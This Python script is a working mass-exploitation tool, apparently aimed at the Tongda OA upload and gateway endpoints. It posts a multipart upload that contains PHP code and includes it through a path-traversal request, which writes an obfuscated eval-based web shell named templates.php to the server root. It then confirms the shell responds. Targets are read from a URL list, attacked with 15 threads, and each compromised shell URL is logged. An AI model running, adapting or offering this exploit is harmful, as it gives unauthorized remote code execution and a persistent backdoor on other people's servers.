import requests
import threadpool
import urllib3

urllib3.disable_warnings()
header = {
    "Proxy-Connection": "keep-alive",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
    "Content-Type": "multipart/form-data; boundary=----fuck123",
    "Referer": "https://google.com",
    "Cookie": "PHPSESSID=t1siainkqniudf9pasd1tl6tn7; KEY_RANDOMDATA=1234",
    "Connection": "close",
}
proxy = {       # debug
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

def wirte_targets(vurl, filename):
    with open(filename, "a+") as f:
        f.write(vurl + "\n")
        return vurl

def exp(u):
    shell_name = "templates.php"
    shell_dir = "/"
    path = shell_dir + shell_name
    check_flag = "aaaabbbbccccc"
    # <?php $a="~+d()"^"!{+{}";$b=${$a}["a"];eval("n".$b);echo 112233;?>
    b64_shell_content = "PD9waHAgJGE9In4rZCgpIl4iIXsre30iOyRiPSR7JGF9WyJhIl07ZXZhbCgibiIuJGIpO2VjaG8gMTEyMjMzOz8++ZW5jb2RlKCIkZGF0YSIpKTsKICAgIH0KfQokdGVzdD1uZXcgVEVTVDsKJHRlc3QtPmFudCgka2V5KTsKPz4K"
    data1 = "------fuck123\r\nContent-Disposition: form-data; name=\"UPLOAD_MODE\"\r\n\r\n2\r\n------fuck123\r\nContent-Disposition: form-data; name=\"P\"\r\n\r\n123\r\n------fuck123\r\nContent-Disposition: form-data; name=\"DEST_UID\"\r\n\r\n1\r\n------fuck123\r\nContent-Disposition: form-data; name=\"ATTACHMENT\"; filename=\"jpg\"\r\nContent-Type: image/jpeg\r\n\r\n<?php\r\nfile_put_contents(\"../" + path + "\", base64_decode('" + b64_shell_content + "'));\r\necho \"" + check_flag + "\";\r\n?>\r\n------fuck123--"
    try:
        req1 = requests.post(u + "/ispirit/im/upload.php", headers=header, verify=False, data=data1,  timeout=25)
        if req1.status_code == 200 and "+OK " in req1.text:
            text = req1.text
            jpg_filename = text[text.find("_")+1:text.find("|")]
            data2 = 'json={"url":"/general/../../attach/im/2003/' + jpg_filename + '.jpg"}'
            header["Content-Type"] = "application/x-www-form-urlencoded"
            req2 = requests.post(u + "/mac/gateway.php", headers=header, verify=False, data=data2,  timeout=25)
            if req2.status_code == 404:
                req2 = requests.post(u + "/ispirit/interface/gateway.php", headers=header, verify=False, data=data2,  timeout=25)
            if req2.status_code == 200 and check_flag in req2.text:
                shell = u + path
                shell_flag = "112233"
                req3 = requests.get(shell, headers=header, verify=False,  timeout=25)
                if shell_flag in req3.text:
                    print(wirte_targets(shell, "vuln.txt"))
    except:
        return

def multithreading(funcname, params=[], filename="url.txt", pools=5):
    works = []
    with open(filename, "r") as f:
        for i in f:
            func_params = [i.rstrip("\n")] + params
            works.append((func_params, None))
    pool = threadpool.ThreadPool(pools)
    reqs = threadpool.makeRequests(funcname, works)
    [pool.putRequest(req) for req in reqs]
    pool.wait()

def main():
    multithreading(exp, [], "url.txt", 15)  # 默认15线程

if __name__ == "__main__":
    main()
